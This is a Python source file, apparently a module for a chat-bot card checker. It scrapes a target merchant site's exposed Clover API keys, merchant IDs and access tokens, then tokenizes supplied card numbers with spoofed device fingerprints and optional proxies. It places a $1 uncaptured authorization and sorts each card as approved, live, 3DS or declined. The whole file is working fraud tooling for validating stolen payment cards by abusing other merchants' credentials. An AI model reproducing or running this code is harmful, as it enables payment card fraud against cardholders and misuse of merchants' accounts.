import requests
import json
import re
import uuid
import random
import string
import asyncio

def _generate_clover_fingerprint():
    return {
        'fingerprint': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
        'sessionId': str(uuid.uuid4()).replace('-', ''),
        'deviceId': 'web_' + ''.join(random.choices(string.hexdigits, k=16)).lower(),
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    }

def _detect_card_brand(cc):
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('51', '52', '53', '54', '55'): return 'MASTERCARD'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'UNKNOWN'

def check_card_clover_sync(site_url, cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous Clover Auto Check & Charge engine.
    Scrapes Clover keys from site_url and tokenizes + authorizes/charges.
    Returns: (status, message, brand)
    """
    brand = _detect_card_brand(cc)
    if len(yy) == 2:
        yy = f"20{yy}"

    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url

    s = requests.Session()
    user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    s.headers.update({'User-Agent': user})

    if proxy_url:
        s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Step 1: Connect to target site and scrape keys
        r_site = s.get(site_url, timeout=15)
        html = r_site.text

        pakms_patterns = [
            r'apiAccessKey["\']?\s*[:=]\s*["\']([a-f0-9\-]{20,})["\']',
            r'pakms["\']?\s*[:=]\s*["\']([a-f0-9\-]{20,})["\']',
            r'cloverApiKey["\']?\s*[:=]\s*["\']([a-f0-9\-]{20,})["\']',
            r'PAKMS_KEY["\']?\s*[:=]\s*["\']([a-f0-9\-]{20,})["\']',
            r'ecommerceKey["\']?\s*[:=]\s*["\']([a-f0-9\-]{20,})["\']'
        ]
        api_key = None
        for pat in pakms_patterns:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                api_key = m.group(1)
                break

        merchant_match = re.search(r'merchantId["\']?\s*[:=]\s*["\']([A-Z0-9]{10,})["\']', html, re.IGNORECASE)
        merchant_id = merchant_match.group(1) if merchant_match else None

        token_match = re.search(r'access_token["\']?\s*[:=]\s*["\']([a-f0-9\-]{30,})["\']', html, re.IGNORECASE)
        access_token = token_match.group(1) if token_match else None

        if not api_key:
            return "error", "Missing Clover API key. Use: /cl site_url|cc|mm|yy|cvv", brand

        # Step 2: Tokenize Card via token.clover.com
        fp = _generate_clover_fingerprint()

        token_payload = {
            "card": {
                "number": cc,
                "cvv": cvc,
                "exp_year": yy,
                "exp_month": mm.zfill(2),
                "first6": cc[:6],
                "last4": cc[-4:],
                "brand": brand,
                "address_zip": "10001"
            },
            "apikey": api_key,
            "fingerprint": fp['fingerprint'],
            "sessionId": fp['sessionId'],
            "deviceId": fp['deviceId']
        }
        if merchant_id:
            token_payload["merchantId"] = merchant_id

        headers_tok = {
            'apikey': api_key,
            'accept': 'application/json',
            'content-type': 'application/json',
            'user-agent': user
        }

        r_tok = s.post('https://token.clover.com/v1/tokens', json=token_payload, headers=headers_tok, timeout=15)
        if r_tok.status_code != 200:
            err_txt = r_tok.text[:150]
            try:
                err_json = r_tok.json()
                err_txt = err_json.get('error', {}).get('message') or err_json.get('message') or err_txt
            except Exception:
                pass
            clean_err = str(err_txt).strip()
            if "401" in clean_err or "unauthorized" in clean_err.lower():
                clean_err = "Invalid Merchant API Key"
            else:
                clean_err = re.sub(r'[\{\}\"\:]', '', clean_err).strip()
            return "declined", clean_err, brand

        tok_json = r_tok.json()
        token_id = tok_json.get('id')
        if not token_id:
            return "declined", "Failed to retrieve token ID", brand

        # Step 3: Charge / Authorize via scl.clover.com
        charge_url = "https://scl.clover.com/v1/charges"
        charge_payload = {
            "amount": 100, # $1.00 USD
            "currency": "usd",
            "source": token_id,
            "description": "Validation Charge",
            "capture": False
        }
        charge_headers = {
            "content-type": "application/json"
        }
        if access_token:
            charge_headers["Authorization"] = f"Bearer {access_token}"
        else:
            charge_headers["apikey"] = api_key

        r_charge = s.post(charge_url, json=charge_payload, headers=charge_headers, timeout=20)
        
        if r_charge.status_code == 200:
            return "approved", "Card Authorized / Approved", brand

        try:
            err_json = r_charge.json()
            err_msg = err_json.get('error', {}).get('message', r_charge.text[:100])
        except Exception:
            err_msg = r_charge.text[:100]

        err_lower = err_msg.lower()
        if "insufficient_funds" in err_lower:
            return "live", "Insufficient Funds", brand
        elif "cvc" in err_lower or "cvv" in err_lower:
            return "live", "CVV Mismatch", brand
        elif "3d_secure" in err_lower or "three_d_secure" in err_lower or "verification" in err_lower:
            return "3ds", "3D Secure / Verification Required", brand
        else:
            return "declined", err_msg, brand

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_clover(site_url, cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_clover_sync.
    """
    return await asyncio.to_thread(check_card_clover_sync, site_url, cc, mm, yy, cvc, proxy_url=proxy_url)
